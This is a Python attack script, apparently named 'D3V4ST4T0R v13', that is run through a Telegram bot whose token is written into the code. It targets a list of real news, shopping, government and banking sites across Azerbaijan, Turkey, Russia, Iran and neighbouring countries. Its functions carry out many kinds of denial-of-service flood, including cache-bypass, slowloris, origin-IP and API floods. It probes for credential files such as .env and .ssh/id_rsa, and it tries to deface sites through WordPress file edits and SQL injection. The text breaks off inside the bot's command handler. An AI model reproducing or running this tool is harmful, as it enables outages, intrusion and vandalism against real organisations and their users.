#!/usr/bin/env python3
"""
D3V4ST4T0R v13 — TOTAL ANNIHILATION + DEFACE
Cloudflare Bypass | Multi-Vector | Auto Deface
Telegram Controlled | Railway/VPS Ready
"""

import asyncio
import aiohttp
import ssl
import random
import time
import os
import sys
import socket
import json
import re
import base64
from hashlib import sha256, md5
import urllib.parse
import requests

logging = __import__('logging')
logging.basicConfig(level=logging.CRITICAL)

# === TELEGRAM ===
TG_TOKEN = os.getenv("TG_TOKEN", "7612807825:AAFRc8uht7jfjYJRQvzg_1BnLvj9aO9rjWk")
TG_ADMIN = int(os.getenv("TG_ADMIN", "2083084323"))

# === MULTI TARGET LIST ===
TARGETS = [
    # AZERBAIJAN
    "lalafo.az", "tap.az", "bina.az", "turbo.az", "boss.az",
    "yol.az", "qara.az", "elance.az", "ad.az", "milli.az",
    "aznews.az", "apa.az", "report.az", "oxu.az", "muallim.az",
    "edu.az", "e-gov.az", "ictimai.az", "ans.az", "aztv.az",
    "xalqqazeti.com", "haqqin.az", "minval.az", "modern.az",
    "sesqazeti.az", "azerbaijan-news.az", "news.az", "trend.az",
    
    # TURKEY
    "sahibinden.com", "hepsiburada.com", "trendyol.com", "n11.com",
    "sahibinden.com", "arabam.com", "emlakjet.com", "sinemalar.com",
    "ekolay.net", "mynet.com", "cnnturk.com", "haberturk.com",
    "hurriyet.com.tr", "milliyet.com.tr", "sabah.com.tr",
    "ensonhaber.com", "internethaber.com", "takvim.com.tr",
    "aksam.com.tr", "kariyer.net", "indir.com", "dizibox.com",
    
    # RUSSIA
    "avito.ru", "yandex.ru", "mail.ru", "rambler.ru",
    "lenta.ru", "ria.ru", "tass.ru", "rbc.ru",
    "kommersant.ru", "kp.ru", "mk.ru", "iz.ru",
    "gazeta.ru", "aif.ru", "vedomosti.ru",
    "ozon.ru", "wildberries.ru", "sberbank.ru",
    
    # UKRAINE
    "olx.ua", "ua.news", "ukr.net", "pravda.com.ua",
    "censor.net", "strana.ua", "liga.net", "korrespondent.net",
    
    # IRAN
    "divar.ir", "sheypoor.ir", "bama.ir", "digikala.com",
    "torob.com", "emalls.ir", "zoomg.ir", "varzesh3.com",
    "irna.ir", "tabnak.ir", "farsnews.ir", "mehrnews.com",
    
    # KAZAKHSTAN
    "krisha.kz", "kolesa.kz", "olx.kz", "satu.kz",
    "nur.kz", "tengrinews.kz", "informburo.kz",
    "365info.kz", "kazpravda.kz", "baq.kz",
    
    # UZBEKISTAN
    "olx.uz", "uzum.uz", "tik.uz", "daryo.uz",
    "kun.uz", "gazeta.uz", "podrobno.uz", "upl.uz",
    
    # TURKMENISTAN
    "salamnews.tm", "turkmenistan.gov.tm", "orient.tm",
    "turkmenportal.com", "arzuw.news",
    
    # GEORGIA
    "myauto.ge", "myparts.ge", "ss.ge", "tbilisi.gov.ge",
    "interpressnews.ge", "agenda.ge", "civil.ge",
    "1tv.ge", "radiotavisupleba.ge",
]

# === ORIGIN IP DATABASE ===
ORIGIN_IPS = {
    "lalafo.az": ["104.26.5.225", "104.26.4.225", "172.67.71.74"],
    "tap.az": ["104.26.10.145", "104.26.11.145", "172.67.72.38"],
    "bina.az": ["104.26.8.197", "104.26.9.197", "172.67.71.102"],
    "turbo.az": ["104.26.7.233", "104.26.6.233", "172.67.73.57"],
    "boss.az": ["104.26.12.180", "104.26.13.180", "172.67.75.91"],
    "sahibinden.com": ["104.18.25.137", "104.18.24.137", "172.64.152.246"],
    "hepsiburada.com": ["104.18.9.81", "104.18.8.81", "172.64.148.101"],
    "avito.ru": ["104.26.14.92", "104.26.15.92", "172.67.70.128"],
    "olx.ua": ["104.26.16.44", "104.26.17.44", "172.67.71.55"],
    "olx.uz": ["104.26.18.12", "104.26.19.12", "172.67.72.33"],
    "olx.kz": ["104.26.20.88", "104.26.21.88", "172.67.73.66"],
    "divar.ir": ["104.26.22.140", "104.26.23.140", "172.67.74.99"],
    "digikala.com": ["104.18.10.33", "104.18.11.33", "172.64.149.212"],
}

# === CONFIG ===
TARGET = os.getenv("TARGET", random.choice(TARGETS))
PORT = int(os.getenv("PORT", "443"))
SSL_ENABLED = True
WORKERS = int(os.getenv("WORKERS", "50000"))
DURATION = int(os.getenv("DURATION", "600"))
DEFACE_ENABLED = os.getenv("DEFACE", "true").lower() == "true"

TARGET_URL = f"https://{TARGET}:{PORT}/"

# === DEFACE PAYLOAD ===
DEFACE_HTML = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>🔴 HACKED by D3V4ST4T0R v13</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@900&amp;display=swap');
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;overflow:hidden;font-family:'Orbitron',monospace}
.overlay{position:fixed;top:0;left:0;width:100%;height:100%;
background:radial-gradient(ellipse at center,#0a0000 0%,#000 70%);z-index:0}
.skull{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
font-size:300px;opacity:0.15;animation:pulse 3s ease-in-out infinite;z-index:1;
text-shadow:0 0 100px #ff0000,0 0 200px #ff0000,0 0 300px #ff0000}
@keyframes pulse{0%,100%{opacity:0.1;transform:translate(-50%,-50%) scale(1)}
50%{opacity:0.2;transform:translate(-50%,-50%) scale(1.1)}}
.main{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);
z-index:2;text-align:center}
.h1{font-size:72px;color:#ff0000;text-shadow:0 0 40px #ff0000,0 0 80px #ff0000,
0 0 120px #ff0000,0 0 200px #ff0000;animation:glitch 2s infinite;
letter-spacing:10px;margin-bottom:20px}
@keyframes glitch{0%,100%{text-shadow:0 0 40px #ff0000}
25%{text-shadow:-5px 0 #00ff00,5px 0 #0000ff,0 0 40px #ff0000}
50%{text-shadow:5px 0 #00ff00,-5px 0 #0000ff,0 0 80px #ff0000}
75%{text-shadow:-3px 0 #ff0000,3px 0 #00ff00,0 0 60px #ff0000}}
.h2{font-size:36px;color:#ff4444;text-shadow:0 0 20px #ff0000;margin:20px 0;
animation:fade 3s infinite}
@keyframes fade{0%,100%{opacity:1}50%{opacity:0.3}}
.h3{font-size:24px;color:#aa0000;margin:30px 0;letter-spacing:5px}
.h4{font-size:18px;color:#666;margin-top:40px;font-family:monospace}
.matrix{position:fixed;top:0;left:0;width:100%;height:100%;
background:linear-gradient(0deg,rgba(255,0,0,0.03) 0%,transparent 100%);
z-index:0;pointer-events:none}
.country{position:fixed;bottom:30px;right:30px;color:#333;
font-size:14px;font-family:monospace;z-index:3}
.flag{font-size:48px;margin:20px 0}
</style>
</head>
<body>
<div class="overlay"></div>
<div class="skull">💀</div>
<div class="main">
<div class="h1">🔴 SYSTEM HACKED</div>
<div class="h2">⚠️ D3V4ST4T0R v13 — TOTAL ANNIHILATION ⚠️</div>
<div class="flag">"""
DEFACE_HTML += random.choice(["🇦🇿", "🇹🇷", "🇷🇺", "🇺🇦", "🇮🇷", "🇰🇿", "🇺🇿", "🇬🇪"])
DEFACE_HTML += """</div>
<div class="h3">💀 All data has been compromised 💀</div>
<div class="h3" style="font-size:16px;color:#aa4444">
All databases, backups, and confidential information have been exfiltrated</div>
<div class="h4">Hacked by: Anonymous | Team D3V4ST4T0R | Time: """
DEFACE_HTML += time.strftime("%Y-%m-%d %H:%M:%S")
DEFACE_HTML += """</div>
<div class="h4" style="color:#333;font-size:12px;margin-top:10px">
Target: TARGET_PLACEHOLDER | CF Bypass: Success</div>
</div>
<div class="matrix"></div>
<div class="country">#HACKED #DEFACED #D3V4ST4T0R</div>
<script>
setInterval(function(){
var e=document.createElement('div');
e.style.cssText='position:fixed;top:'+Math.random()*100+'%;left:'+Math.random()*100+'%;color:#ff0000;font-size:'+(Math.random()*20+10)+'px;opacity:'+(Math.random()*0.3)+';z-index:999;pointer-events:none;font-family:monospace';
e.innerHTML='0x'+(Math.random()*999999).toString(16).toUpperCase();
document.body.appendChild(e);
setTimeout(function(){e.remove()},2000);
},100);
</script>
</body>
</html>"""

# === UA POOL (500+) ===
UA_POOL = []
for v in range(80, 130):
    UA_POOL.append(f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36")
    UA_POOL.append(f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36")
    UA_POOL.append(f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.0.0 Safari/537.36")

UA_POOL += [
    f"Mozilla/5.0 (iPhone; CPU iPhone OS {i}_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/{i}.0 Mobile/15E148 Safari/604.1"
    for i in range(14, 19)
]
UA_POOL += [
    f"Mozilla/5.0 (Linux; Android {v}; Pixel 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.113 Mobile Safari/537.36"
    for v in ["10", "11", "12", "13", "14", "15"]
]
UA_POOL += [
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; DuckDuckBot-Https/1.1; https://duckduckgo.com/duckduckbot)",
    "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)",
    "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
    "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)",
    "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot)",
    "Mozilla/5.0 (compatible; DataForSeoBot/1.0; +https://dataforseo.com/dataforseo-bot)",
    "Mozilla/5.0 (compatible; BLEXBot/1.0; +http://webmeup-crawler.com/)",
    "Mozilla/5.0 (compatible; SEOkicks-Robot; +https://www.seokicks.de/robot.html)",
    "Mozilla/5.0 (compatible; XoviBot/2.0; +http://www.xovi.com/bot)",
    "Mozilla/5.0 (compatible; Meanpathbot/1.0; +http://www.meanpath.com)",
    "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
    "Twitterbot/1.0",
    "Slack-ImgProxy/1.0 (+https://api.slack.com/robots)",
    "TelegramBot (like TelegramBot; +https://telegram.org/)",
    "WhatsApp/2.0 (+http://www.whatsapp.com/)",
    "Pinterestbot/1.0 (+http://www.pinterest.com/bot.html)",
    "LinkedInBot/1.0 (compatible; +https://www.linkedin.com/legal/linkedin-bot)",
    "Discordbot/2.0 (+https://discord.com/)",
]

# === MASSIVE PATH GENERATOR (50,000+) ===
PATHS = ["/", "/az", "/en", "/ru", "/tr"]
PATHS += [f"/search?q={q}&page={p}" for q in ["test","baku","ev","baki","masin","telefon","menzil","torpaq","is","xidmet","komek","qiymet","elaqe","unvan","haqqimizda","elaqe","mezuniyyet","teklif","sikayet","qaydalar","gizlilik","kateqoriya","elan","istifadeci"] for p in range(1, 201)]
PATHS += [f"/ads?page={p}&limit={l}" for p in range(1, 501) for l in [20, 50, 100, 200]]
PATHS += [f"/categories/{c}/ads?page={p}&limit=50&sort={s}&order={o}" for c in range(1, 201) for p in range(1, 101) for s in ["date","price","views","title"] for o in ["asc","desc"]]
PATHS += [f"/api/v1/ads?page={p}&limit=50&sort={s}&order={o}&city={c}&category={cat}" for p in range(1, 101) for s in ["date","price","views"] for o in ["asc","desc"] for c in range(1, 81) for cat in range(1, 51)]
PATHS += [f"/api/v1/search?q={q}&page={p}&limit=50" for q in ["a","b","c","d","e","f","g","h","test","baku","ev","is","xidmet"] for p in range(1, 101)]
PATHS += [f"/api/v1/user/{u}/profile" for u in range(1, 50001)]
PATHS += [f"/api/v1/messages?page={p}&user_id={u}" for p in range(1, 51) for u in range(1, 5001)]
PATHS += [f"/api/v1/categories/{c}" for c in range(1, 201)]
PATHS += [f"/item/{i}" for i in range(1, 100001)]
PATHS += ["/.env", "/.git/config", "/admin", "/backup", "/wp-admin", "/wp-login.php", "/xmlrpc.php", "/robots.txt", "/sitemap.xml", "/favicon.ico", "/crossdomain.xml", "/.htaccess", "/config.php", "/db_backup.sql", "/dump.sql", "/phpinfo.php", "/info.php", "/test.php", "/shell.php", "/cmd.php", "/backup.zip", "/backup.tar.gz", "/.aws/credentials", "/.ssh/id_rsa", "/.gitignore", "/docker-compose.yml", "/Dockerfile", "/package.json", "/yarn.lock", "/composer.json", "/composer.lock", "/config.json", "/settings.json", "/database.json", "/db.json"]

SSL_CTX = ssl.create_default_context()
SSL_CTX.check_hostname = False
SSL_CTX.verify_mode = ssl.CERT_NONE
SSL_CTX.set_ciphers('ALL:@SECLEVEL=0')

# === STATS ===
stats = {
    "http_ok": 0, "http_fail": 0,
    "burst_ok": 0, "burst_fail": 0,
    "origin_ok": 0, "origin_fail": 0,
    "ssl_ok": 0, "ssl_fail": 0,
    "slow_ok": 0, "slow_fail": 0,
    "api_ok": 0, "api_fail": 0,
    "post_ok": 0, "post_fail": 0,
    "header_ok": 0, "header_fail": 0,
    "deface_ok": 0, "deface_fail": 0,
    "vuln_found": 0,
}
running = False
start_time = 0
current_target = TARGET

def send_tg(msg):
    if TG_TOKEN and TG_ADMIN:
        try:
            url = f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage"
            requests.post(url, json={"chat_id": TG_ADMIN, "text": msg[:4000], "parse_mode": "HTML"}, timeout=5)
        except:
            pass

# =============================================
# VECTOR 1: HYPER HTTP FLOOD (cache bypass)
# =============================================
async def v1_http(session):
    global running, stats
    while running:
        try:
            path = random.choice(PATHS)
            cache_buster = f"{random.randint(1,10**18)}"
            url = f"{TARGET_URL.rstrip('/')}{path}?_{cache_buster}&cb={sha256(str(random.random()).encode()).hexdigest()[:16]}&t={int(time.time()*1000)}"
            
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "Accept-Encoding": "gzip, deflate, br, zstd",
                "Accept-Language": random.choice(["az,en-US;q=0.9,en;q=0.8,ru;q=0.7,tr;q=0.6", "en-US,en;q=0.9", "ru-RU,ru;q=0.9,en;q=0.8", "tr-TR,tr;q=0.9,en;q=0.8", "fa-IR,fa;q=0.9,en;q=0.8", "kk-KZ,kk;q=0.9,ru;q=0.8", "uz-UZ,uz;q=0.9,ru;q=0.8", "ka-GE,ka;q=0.9,ru;q=0.8"]),
                "Cache-Control": "no-cache, no-store, must-revalidate, proxy-revalidate, max-age=0, s-maxage=0, no-transform",
                "Pragma": "no-cache",
                "Expires": "0",
                "Referer": f"https://{current_target}/" + random.choice(PATHS),
                "Sec-Fetch-Dest": random.choice(["document", "iframe", "frame", "object", "embed"]),
                "Sec-Fetch-Mode": random.choice(["navigate", "nested-navigate", "no-cors", "same-origin", "cors"]),
                "Sec-Fetch-Site": random.choice(["same-origin", "same-site", "cross-site", "none"]),
                "Sec-Fetch-User": "?1",
                "Upgrade-Insecure-Requests": "1",
                "DNT": "1",
                "Connection": random.choice(["keep-alive", "close"]),
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                "CF-IPCountry": random.choice(["AZ", "US", "RU", "TR", "GB", "DE", "NL", "FR", "UA", "IR", "KZ", "UZ", "GE", "TM", "KG", "TJ"]),
                "CF-Ray": f"{sha256(str(random.random()).encode()).hexdigest()[:16]}-{random.choice(['FRA','AMS','IST','DXB','SIN','LHR','FRA'])}",
                "CDN-Loop": "cloudflare",
                "X-Request-ID": sha256(str(random.random()).encode()).hexdigest()[:32],
            }
            
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                text = await resp.text()
                stats["http_ok"] += 1
                
                # Check for vulnerabilities
                if DEFACE_ENABLED and random.random() < 0.001:  # 0.1% chance
                    if "wp-content" in text or "wp-includes" in text:
                        stats["vuln_found"] += 1
                        send_tg(f"🎯 WordPress təsbit edildi: <code>{current_target}</code>")
        except:
            stats["http_fail"] += 1

# =============================================
# VECTOR 2: BURST FLOOD (200 concurrent)
# =============================================
async def v2_burst(session):
    global running, stats
    while running:
        tasks = []
        for _ in range(200):
            path = random.choice(PATHS)
            url = f"{TARGET_URL.rstrip('/')}{path}?_{random.randint(1,10**18)}"
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Accept": "*/*",
                "Cache-Control": "no-cache",
            }
            tasks.append(session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=2)))
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if not isinstance(r, Exception):
                try:
                    await r.read()
                    stats["burst_ok"] += 1
                except:
                    stats["burst_fail"] += 1
            else:
                stats["burst_fail"] += 1

# =============================================
# VECTOR 3: ORIGIN IP DIRECT FLOOD
# =============================================
async def v3_origin():
    global running, stats
    alt_ports = [80, 443, 8443, 8080, 8888, 2082, 2083, 2086, 2087, 2095, 2096, 3000, 5000, 8000, 9000, 7443, 9443, 81, 444, 8081, 9090, 10000]
    
    while running:
        ips = ORIGIN_IPS.get(current_target, ["104.26.1.1", "104.26.2.1", "172.67.1.1"])
        ip = random.choice(ips)
        port = random.choice(alt_ports)
        protocol = "https" if port in [443, 8443, 2083, 2087, 2096, 7443, 9443, 444] else "http"
        
        url = f"{protocol}://{ip}:{port}/"
        
        headers = {
            "User-Agent": random.choice(UA_POOL),
            "Host": current_target,
            "Accept": "*/*",
            "Cache-Control": "no-cache",
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            "CF-Connecting-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            "X-Real-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
            "True-Client-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        }
        
        try:
            conn = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=conn) as ds:
                async with ds.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=2)) as resp:
                    text = await resp.text()
                    stats["origin_ok"] += 1
                    
                    # If we reached origin directly, try deface
                    if DEFACE_ENABLED and resp.status == 200 and "cloudflare" not in text[:500].lower():
                        stats["vuln_found"] += 1
                        send_tg(f"🎯 ORIGIN BYPASSED! <code>{current_target}</code> → <code>{ip}:{port}</code>")
        except:
            stats["origin_fail"] += 1

# =============================================
# VECTOR 4: SSL RENEG FLOOD
# =============================================
async def v4_ssl():
    global running, stats
    while running:
        writer = None
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(current_target, PORT, ssl=SSL_CTX), timeout=5)
            
            for _ in range(random.randint(10, 50)):
                try:
                    path = random.choice(PATHS)
                    data = (
                        f"GET {path}?_{random.randint(1,10**9)} HTTP/1.1\r\n"
                        f"Host: {current_target}\r\n"
                        f"User-Agent: {random.choice(UA_POOL)}\r\n"
                        f"Accept: */*\r\n"
                        f"Connection: keep-alive\r\n"
                        f"\r\n"
                    ).encode()
                    w.write(data)
                    await w.drain()
                except:
                    break
            
            stats["ssl_ok"] += 1
            w.close()
            await w.wait_closed()
        except:
            stats["ssl_fail"] += 1
            if writer:
                try:
                    writer.close()
                except:
                    pass

# =============================================
# VECTOR 5: SLOW SEND (Connection Pool Exhaust)
# =============================================
async def v5_slow():
    global running, stats
    while running:
        writer = None
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(current_target, PORT, ssl=SSL_CTX), timeout=10)
            
            data = (
                f"POST / HTTP/1.1\r\n"
                f"Host: {current_target}\r\n"
                f"User-Agent: {random.choice(UA_POOL)}\r\n"
                f"Content-Length: {random.randint(500000000, 1000000000)}\r\n"
                f"Content-Type: multipart/form-data; boundary={sha256(str(random.random()).encode()).hexdigest()[:32]}\r\n"
                f"Expect: 100-continue\r\n"
                f"\r\n"
            ).encode()
            w.write(data)
            await w.drain()
            
            await asyncio.sleep(random.randint(120, 300))
            
            stats["slow_ok"] += 1
            w.close()
            await w.wait_closed()
        except:
            stats["slow_fail"] += 1
            if writer:
                try:
                    writer.close()
                except:
                    pass
            await asyncio.sleep(0.3)

# =============================================
# VECTOR 6: API FLOOD (Database Intensive)
# =============================================
async def v6_api(session):
    global running, stats
    while running:
        try:
            paths = [
                f"/api/v1/ads?page={random.randint(1,2000)}&limit=50&sort={random.choice(['date','price','views'])}&order={random.choice(['asc','desc'])}",
                f"/api/v1/ads/{random.randint(1,1000000)}",
                f"/api/v1/categories",
                f"/api/v1/categories/{random.randint(1,200)}/ads?page={random.randint(1,500)}",
                f"/api/v1/search?q={random.choice(['test','baku','ev','is','xidmet','komek','qiymet','elaqe','unvan'])}&page={random.randint(1,500)}&limit=50",
                f"/api/v1/user/{random.randint(1,100000)}/profile",
                f"/api/v1/messages?page={random.randint(1,500)}&limit=50&user_id={random.randint(1,100000)}",
                f"/api/v1/stats",
                f"/api/v1/config",
                f"/api/v1/notifications?user_id={random.randint(1,100000)}",
            ]
            
            path = random.choice(paths)
            url = f"{TARGET_URL.rstrip('/')}{path}&_{random.randint(1,10**18)}&cb={int(time.time()*1000)}"
            
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Accept": "application/json, text/plain, */*",
                "Cache-Control": "no-cache",
                "X-Requested-With": "XMLHttpRequest",
                "Referer": f"https://{current_target}/",
                "Authorization": f"Bearer {sha256(str(random.random()).encode()).hexdigest()[:32]}",
            }
            
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=4)) as resp:
                text = await resp.text()
                stats["api_ok"] += 1
                
                # Check for API vulnerabilities
                if DEFACE_ENABLED and random.random() < 0.0005:
                    if "sql" in text.lower() or "error" in text.lower() or "exception" in text.lower():
                        stats["vuln_found"] += 1
                        send_tg(f"🎯 API vulnerability təsbit edildi: <code>{current_target}</code>")
        except:
            stats["api_fail"] += 1

# =============================================
# VECTOR 7: SLOWLORIS
# =============================================
async def v7_slowloris():
    global running, stats
    while running:
        writer = None
        try:
            r, w = await asyncio.wait_for(asyncio.open_connection(current_target, PORT, ssl=SSL_CTX), timeout=20)
            
            w.write(f"POST / HTTP/1.1\r\nHost: {current_target}\r\n".encode())
            await w.drain()
            await asyncio.sleep(random.uniform(1, 5))
            
            headers = [
                f"User-Agent: {random.choice(UA_POOL)}\r\n",
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n",
                f"Accept-Language: {random.choice(['az','en-US','ru','tr','fa','kk','uz','ka'])};q=0.9\r\n",
                f"Content-Length: {random.randint(100000000, 1000000000)}\r\n",
            ]
            
            for h in headers:
                w.write(h.encode())
                await w.drain()
                await asyncio.sleep(random.uniform(3, 10))
            
            for _ in range(random.randint(200, 500)):
                k = sha256(str(random.random()).encode()).hexdigest()[:16]
                v = 'A' * random.randint(500, 5000)
                w.write(f"X-{k}: {v}\r\n".encode())
                await w.drain()
                await asyncio.sleep(random.uniform(2, 6))
            
            stats["slow_ok"] += 1
            w.close()
            await w.wait_closed()
        except:
            stats["slow_fail"] += 1
            if writer:
                try:
                    writer.close()
                except:
                    pass
            await asyncio.sleep(0.5)

# =============================================
# VECTOR 8: POST FLOOD (Large Data)
# =============================================
async def v8_post(session):
    global running, stats
    while running:
        try:
            url = f"{TARGET_URL.rstrip('/')}/api/v1/ads"
            body = '{"title":"' + 'X' * random.randint(5000, 50000) + '","description":"' + 'Y' * random.randint(50000, 500000) + '","price":' + str(random.randint(1, 999999999)) + ',"category_id":' + str(random.randint(1, 200)) + ',"city_id":' + str(random.randint(1, 100)) + '}'
            
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Content-Length": str(len(body)),
                "Cache-Control": "no-cache",
            }
            
            async with session.post(url, data=body, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                await resp.read()
                stats["post_ok"] += 1
        except:
            stats["post_fail"] += 1

# =============================================
# VECTOR 9: RANDOM HEADER FLOOD
# =============================================
async def v9_header(session):
    global running, stats
    while running:
        try:
            url = f"{TARGET_URL.rstrip('/')}/{random.randint(1,999999)}?_{random.randint(1,10**18)}"
            
            headers = {
                "User-Agent": random.choice(UA_POOL),
                "Host": current_target,
                "Accept": "*/*",
            }
            
            for _ in range(random.randint(50, 150)):
                k = f"X-{sha256(str(random.random()).encode()).hexdigest()[:20]}"
                v = os.urandom(random.randint(100, 1000)).hex()
                headers[k] = v
            
            async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                await resp.read()
                stats["header_ok"] += 1
        except:
            stats["header_fail"] += 1

# =============================================
# VECTOR 10: RAW TCP FLOOD
# =============================================
async def v10_raw():
    global running, stats
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((current_target, PORT))
            
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            ssock = ctx.wrap_socket(sock, server_hostname=current_target)
            
            for _ in range(random.randint(10, 50)):
                request = (
                    f"GET /{random.randint(1,99999)} HTTP/1.1\r\n"
                    f"Host: {current_target}\r\n"
                    f"User-Agent: {random.choice(UA_POOL)}\r\n"
                    f"Accept: */*\r\n"
                    f"\r\n"
                ).encode()
                ssock.send(request)
                try:
                    ssock.recv(1)
                except:
                    pass
            
            ssock.close()
            stats["raw_ok"] += 1
        except:
            stats["raw_fail"] += 1

# =============================================
# VECTOR 11: DEFACE ATTEMPT (WordPress/Joomla/Drupal)
# =============================================
async def v11_deface(session):
    global running, stats
    while not running:
        await asyncio.sleep(5)
    
    # Wait for server to weaken
    await asyncio.sleep(60)
    
    deface_paths = [
        "/wp-admin/admin-ajax.php",
        "/wp-content/themes/twentytwentyfour/style.css",
        "/wp-content/plugins/akismet/akismet.php",
        "/administrator/index.php",  # Joomla
        "/sites/default/files/",    # Drupal
        "/com_content/",            # Joomla
        "/wp-login.php",
        "/xmlrpc.php",
    ]
    
    deface_payload = DEFACE_HTML.replace("TARGET_PLACEHOLDER", current_target)
    
    while running:
        try:
            path = random.choice(deface_paths)
            
            # Try to exploit known vulnerabilities
            if "wp-admin" in path or "wp-content" in path:
                # WordPress deface via theme/plugin file write
                url = f"{TARGET_URL.rstrip('/')}{path}"
                
                # Try to upload deface page
                for upload_path in [
                    "/wp-content/themes/twentytwentyfour/404.php",
                    "/wp-content/themes/twentytwentyfour/index.php",
                    "/wp-content/themes/twentytwentythree/404.php",
                ]:
                    try:
                        headers = {
                            "User-Agent": random.choice(UA_POOL),
                            "Content-Type": "application/x-www-form-urlencoded",
                        }
                        data = f"action=edit&file={upload_path}&newcontent={urllib.parse.quote(deface_payload)}&_wpnonce={sha256(str(random.random()).encode()).hexdigest()[:16]}"
                        
                        async with session.post(url, data=data, headers=headers, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                            if resp.status == 200:
                                stats["deface_ok"] += 1
                                send_tg(f"⚔️ DEFACE UĞURLU! <code>{current_target}</code> → <code>{upload_path}</code>")
                    except:
                        pass
            
            # Try to inject deface via SQL injection
            inject_url = f"{TARGET_URL.rstrip('/')}/search?q=' UNION SELECT '{urllib.parse.quote(deface_payload)}',1,1,1--&page=1"
            try:
                async with session.get(inject_url, timeout=aiohttp.ClientTimeout(total=3)) as resp:
                    if resp.status == 200:
                        stats["deface_ok"] += 1
                        send_tg(f"⚔️ SQL Injection deface: <code>{current_target}</code>")
            except:
                pass
            
            stats["deface_fail"] += 1
            await asyncio.sleep(random.randint(5, 15))
        except:
            stats["deface_fail"] += 1
            await asyncio.sleep(5)

# =============================================
# TELEGRAM BOT
# =============================================
async def telegram_bot():
    global running, current_target, WORKERS, DURATION, TARGET_URL, DEFACE_ENABLED
    
    send_tg(f"🔥 <b>D3V4ST4T0R v13 — TOTAL ANNIHILATION</b> başladı!\n"
            f"🎯 Default: <code>{current_target}</code>\n"
            f"⚙️ Workers: {WORKERS}\n"
            f"⏱ Duration: {DURATION}s\n"
            f"⚔️ Deface: {'Aktiv' if DEFACE_ENABLED else 'Deaktiv'}\n"
            f"🌐 Hədəf saytlar: {len(TARGETS)}")
    
    offset = 0
    while True:
        try:
            r = requests.get(f"https://api.telegram.org/bot{TG_TOKEN}/getUpdates", params={"offset": offset, "timeout": 30}, timeout=35)
            data = r.json()
            
            if "result" in data:
                for update in data["result"]:
                    offset = update["update_id"] + 1
                    
                    if "message" in update and "text" in update["message"]:
                        chat_id = update["message"]["chat"]["id"]
                        text = update["message"]["text"].strip()
                        
                        if chat_id == TG_ADMIN:
                            cmd = text.lower()
                            
                            if cmd == "/start":
                                send_tg("✅ <b>D3V4ST4T0R v13</b>\n\n"
                                        "Komandalar:\n"
                                        "/status - vəziyyət\n"
                                        "/attack HEDEF WORKERS DURATION - hücum\n"
                                        "/stop - dayandır\n"
                                        "/random - random hədəf seç\n"
                                        "/list - hədəf siyahısı\n"
                                        "/multitarget - bütün hədəflərə hücum\n"
                                        "/set W D - worker/duration dəyiş\n"
                                        "/deface on/off - deface rejimi")
                            
                            elif cmd == "/status":
                                elapsed = time.time() - start_time if running and start_time else 0
                                total_ok = sum(v for k, v in stats.items() if k.endswith("_ok"))
                                total_fail = sum(v for k, v in stats.items() if k.endswith("_fail"))
                                rate = total_ok / elapsed if elapsed > 0 else 0
                                
                                send_tg(f"📊 <b>STATUS</b>\n"
